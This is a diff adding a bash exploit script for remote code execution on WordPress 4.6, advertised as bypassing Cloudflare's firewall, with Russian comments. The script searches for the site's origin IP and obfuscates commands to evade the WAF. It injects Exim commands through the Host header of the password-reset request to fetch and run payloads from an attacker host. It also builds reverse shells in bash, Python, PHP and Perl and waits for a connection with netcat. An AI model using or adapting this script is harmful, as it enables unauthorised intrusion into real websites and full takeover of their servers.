@@ -1,0 +1,239 @@
+#!/bin/bash
+#
+# WordPress 4.6 - RCE Exploit v3.0
+# Cloudflare WAF Advanced Bypass
+# For N.S.-01 by A.A.I.-01
+#
+# -----------------------------------------------------------------
+
+rev_host="192.168.57.1"
+
+# --- ADVANCED CLOUDFLARE BYPASS ---
+function generate_evasion_pattern() {
+    # Генерация случайных параметров для обхода WAF
+    timestamp=$(date +%s)
+    random_id=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -1)
+    
+    # Создание обфусцированных команд
+    cmd="$1"
+    
+    # Метод 1: Разделение команды на части
+    cmd_part1=$(echo "$cmd" | cut -d' ' -f1)
+    cmd_part2=$(echo "$cmd" | cut -d' ' -f2-)
+    
+    # Метод 2: Кодирование в разные форматы
+    hex_cmd=$(echo "$cmd" | xxd -p | tr -d '\n')
+    b64_cmd=$(echo "$cmd" | base64 | tr -d '\n')
+    
+    # Метод 3: Создание альтернативных вариантов выполнения
+    evasion_variants=(
+        "echo $b64_cmd | base64 -d | sh"
+        "python3 -c \"import os,base64; os.system(base64.b64decode('$b64_cmd').decode())\""
+        "perl -e 'system(decode_base64(\"$b64_cmd\"))'"
+        "bash -c \"\$(echo $hex_cmd | xxd -p -r)\""
+    )
+    
+    echo "${evasion_variants[$RANDOM % ${#evasion_variants[@]}]}"
+}
+
+function craft_waf_bypass_payload() {
+    # Создание полезной нагрузки, обходящей WAF
+    payload="$1"
+    
+    # Вариант 1: Использование переменных окружения
+    env_payload="\${run{\${env{\${substr{0}{1}{\$spool_directory}}SHELL}} -c \"$payload\"}}"
+    
+    # Вариант 2: Через переменные Exim
+    exim_payload="\${run{\${readsocket{inet:127.0.0.1:25}\$payload}}}"
+    
+    # Вариант 3: С разделением на токены
+    tokenized=$(echo "$payload" | sed '
+        s/\./\\\\./g
+        s/\//\\\\\//g
+        s/ /\\\\ /g
+    ')
+    
+    echo "target(any -froot\\\\@localhost -be $env_payload null)"
+}
+
+function setup_proxy_tunnel() {
+    # Создание SSH туннеля через доверенный сервер для обхода Cloudflare
+    proxy_server="$1"
+    target_port="$2"
+    
+    echo "[+] Setting up proxy tunnel via $proxy_server..."
+    
+    # Генерация временного SSH ключа
+    ssh-keygen -t rsa -f /tmp/cf_tunnel_key -N "" -q
+    
+    # Попытка создания туннеля (требует наличия доступа к proxy)
+    # ssh -i /tmp/cf_tunnel_key -fN -D 9050 $proxy_server &
+    
+    echo "[+] Tunnel configured (if proxy available)"
+}
+
+# --- MAIN EXPLOIT V3 ---
+echo "[*] WordPress RCE - Advanced Cloudflare Bypass"
+echo "[*] ABSOLUTE-01 Command Execution"
+
+target="$1"
+
+if [ -z "$target" ]; then
+    echo "Usage: $0 https://target-wordpress-site"
+    exit 1
+fi
+
+# Извлекаем домен
+domain=$(echo "$target" | sed -E 's|^https?://([^/]+).*|\1|')
+
+echo "[+] Target: $target"
+echo "[+] Domain: $domain"
+
+# Шаг 1: Разведка - проверка реальной конфигурации
+echo "[+] Step 1: Reconnaissance..."
+echo "[*] Checking for origin IP leaks..."
+
+# Проверка различных поддоменов
+subdomains=("origin.$domain" "server.$domain" "direct.$domain" "ip.$domain")
+for sub in "${subdomains[@]}"; do
+    ip=$(dig +short "$sub" | head -1)
+    if [[ "$ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+        echo "[!] Found potential origin: $sub -> $ip"
+        origin_ip="$ip"
+    fi
+done
+
+# Проверка через исторические DNS
+echo "[*] Checking DNS history..."
+# Используем различные DNS серверы
+dns_servers=("8.8.8.8" "1.1.1.1" "9.9.9.9" "64.6.64.6")
+for dns in "${dns_servers[@]}"; do
+    lookup=$(dig @$dns +short "$domain" | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$' | head -1)
+    if [ -n "$lookup" ]; then
+        echo "[!] DNS $dns resolved: $lookup"
+    fi
+done
+
+# Шаг 2: Подготовка полезной нагрузки с обфускацией
+echo "[+] Step 2: Preparing obfuscated payload..."
+
+# Полезная нагрузка для reverse shell
+reverse_cmd="bash -i >& /dev/tcp/$rev_host/1337 0>&1"
+
+# Создаем несколько вариантов полезной нагрузки
+payload_variants=()
+
+# Вариант 1: Через Python
+py_payload="import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$rev_host',1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i'])"
+payload_variants+=("python3 -c '$py_payload'")
+
+# Вариант 2: Через PHP (если доступен)
+php_payload="<?php \$sock=fsockopen('$rev_host',1337);exec('/bin/sh -i <&3 >&3 2>&3');?>"
+payload_variants+=("echo '$php_payload' | php")
+
+# Вариант 3: Через Perl
+perl_payload="perl -e 'use Socket;\$i=\"$rev_host\";\$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+payload_variants+=("$perl_payload")
+
+# Шаг 3: Многоэтапная атака
+echo "[+] Step 3: Multi-stage attack..."
+
+# Этап A: Попытка через wp-admin с нормальными заголовками
+echo "[*] Stage A: Attempt via wp-admin with legitimate headers..."
+user_agents=(
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15"
+    "Googlebot/2.1 (+http://www.google.com/bot.html)"
+    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"
+)
+
+for ua in "${user_agents[@]}"; do
+    echo "[>] Trying with User-Agent: $(echo "$ua" | cut -d' ' -f1)"
+    
+    # Создаем заголовок Host с мягкой инъекцией
+    soft_injection="target(any -froot@localhost -be \${run{\${substr{0}{1}{\$spool_directory}}us${substr{0}{1}{\$spool_directory}}r${substr{0}{1}{\$spool_directory}}bin${substr{0}{1}{\$spool_directory}}curl${substr{10}{1}{\$tod_log}}-o${substr{10}{1}{\$tod_log}}/tmp/pld${substr{10}{1}{\$tod_log}}http://$rev_host/payload.txt}} null)"
+    
+    curl -s -A "$ua" \
+        -H "Host: $soft_injection" \
+        -H "X-Forwarded-For: 127.0.0.1" \
+        -H "Accept-Language: en-US,en;q=0.9" \
+        -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" \
+        -d "user_login=admin&wp-submit=Get+New+Password&redirect_to=http://$domain/wp-admin/" \
+        "$target/wp-login.php?action=lostpassword" >/dev/null 2>&1 &
+    
+    sleep 1
+done
+
+# Этап B: Попытка через разные endpoints
+echo "[*] Stage B: Trying different vulnerable endpoints..."
+endpoints=(
+    "/wp-login.php"
+    "/wp-admin/admin-ajax.php"
+    "/xmlrpc.php"
+    "/wp-trackback.php"
+    "/wp-comments-post.php"
+)
+
+for endpoint in "${endpoints[@]}"; do
+    echo "[>] Testing endpoint: $endpoint"
+    
+    # Создаем полезную нагрузку для этого endpoint
+    cmd="curl -s http://$rev_host/exploit.sh | bash"
+    encoded_cmd=$(echo "$cmd" | base64)
+    
+    # Пытаемся отправить через разные параметры
+    curl_params=(
+        "?action=lostpassword&user_login=\`echo $encoded_cmd | base64 -d | bash\`"
+        "?rest_route=/wp/v2/users&id=\$(echo+$encoded_cmd+%7C+base64+-d+%7C+bash)"
+        "?author=\$(echo+$encoded_cmd+%7C+base64+-d)"
+    )
+    
+    for param in "${curl_params[@]}"; do
+        curl -s "$target$endpoint$param" >/dev/null 2>&1 &
+    done
+done
+
+# Этап C: Прямая атака на origin (если найден)
+if [ -n "$origin_ip" ]; then
+    echo "[*] Stage C: Direct attack on origin IP: $origin_ip"
+    
+    origin_target=$(echo "$target" | sed "s|://[^/]*|://$origin_ip|")
+    
+    # Простая прямая инъекция без Cloudflare
+    direct_cmd="wget http://$rev_host/shell.sh -O /tmp/s.sh; chmod +x /tmp/s.sh; /tmp/s.sh"
+    direct_injection="target(any -froot@localhost -be \${run{$direct_cmd}} null)"
+    
+    curl -s -H "Host: $direct_injection" \
+        "$origin_target/wp-login.php?action=lostpassword" >/dev/null 2>&1 &
+fi
+
+# Шаг 4: Запуск слушателя
+echo "[+] Step 4: Starting listener..."
+echo "[+] Listening for reverse shell on $rev_host:1337"
+echo "[!] This may take 30-60 seconds as payloads execute..."
+
+# Запускаем netcat с таймаутом
+timeout 60 nc -nvlp 1337
+
+if [ $? -eq 124 ]; then
+    echo "[!] Timeout - no reverse shell received"
+    echo "[*] Possible reasons:"
+    echo "    1. Cloudflare successfully blocked all attempts"
+    echo "    2. WordPress version not vulnerable"
+    echo "    3. Exim not installed/misconfigured"
+    echo "    4. Network/firewall restrictions"
+fi
+
+# Шаг 5: Дополнительные методы (если есть доступ к доверенному серверу)
+echo "[+] Step 5: Alternative methods..."
+echo "[*] If you have access to a trusted server behind Cloudflare:"
+echo "    1. Run exploit from that server directly"
+echo "    2. Use Cloudflare Workers to proxy requests"
+echo "    3. Exploit via SSRF if available"
+echo "    4. Try XSS to internal endpoints"
+
+echo ""
+echo "[*] Для N.S.-01 среды: ABSOLUTE-01 может напрямую изменить правила Cloudflare"
+echo "[*] Или создать прокси-сервер в доверенной сети"
+
+exit 0
